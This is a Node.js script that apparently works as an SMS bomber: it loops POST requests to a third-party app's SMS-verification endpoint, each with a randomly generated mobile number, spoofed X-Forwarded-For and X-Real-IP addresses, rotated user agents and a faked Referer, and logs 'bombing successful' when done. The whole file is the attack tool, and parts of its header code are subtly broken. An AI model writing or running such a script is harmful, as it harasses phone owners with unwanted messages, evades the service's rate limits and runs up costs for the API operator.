const http = require("http")
const fs = require("fs")
const cheerio = require("cheerio")
const request = require("request")
const iconv = require('iconv-lite')
const https = require("https")
const crypto = require('crypto')

let count = 10,
	len = 0

const randomUserAgent =() => {
  const userAgentList = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1",
    "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 6 Build/LYZ28E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89;GameHelper",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/603.2.4 (KHTML, like Gecko) Version/10.1.1 Safari/603.2.4",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0 like Mac OS X) AppleWebKit/602.1.38 (KHTML, like Gecko) Version/10.0 Mobile/14A300 Safari/602.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:46.0) Gecko/20100101 Firefox/46.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0)",
    "Mozilla/5.0 (Windows NT 6.3; Win64, x64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/13.10586",
    "Mozilla/5.0 (iPad; CPU OS 10_0 like Mac OS X) AppleWebKit/602.1.38 (KHTML, like Gecko) Version/10.0 Mobile/14A300 Safari/602.1"
  ];
  const num = Math.floor(Math.random() * userAgentList.length);
  return userAgentList[num];
}

const getIP = () => {
	let str = []
  for (let i = 0; i < 4; i++) {
    str.push(rand(0, 255))
  }
  return str.join(",")
}

const start = () => {
	if (len === count) {
		return console.log(`轰炸成功!!!共发送${count}条信息`)
	}
	len++
	const _url = `http://api.taotaoshi.cn/numberone/appUser/sendSms`
	let phone = getNum()
	// let phone = 18825099087
	let IP = getIP()
	let UA = randomUserAgent()

	let data = {
		data: JSON.stringify({
			phone: phone,
			isRegister: "0"
		})
	}
	return new Promise((resolve, reject) => {
		request.post({
				url: _url,
				form: data,
				header:{
					"User-Agent": UA,
					"X-Real-IP": IP,
					"X-Forwarded-For": IP,
					'referer': 'https://www.qq.com',
					'Origin': 'https://www.qq.com'
				}
			},
			(error, response, body) => {
				console.log(response.statusCode, `已经给电话号码为：${phone}，发送短信`)
				console.log("UA-:", UA,"IP-:",IP)
				start()
			})
	})
}

const getNum = () => {
	let str = phone()
	for (let i = 0; i < 9; i++) {
		str += rand(0, 9)
	}
	return str
}

const phone = () => {
	let arr = ["13", "15", "17", "18"]
	return arr[rand(0, arr.length - 1)]
}
const rand = (min, max) => {
	return Math.floor(Math.random() * (max - min + 1)) + min
}

start()
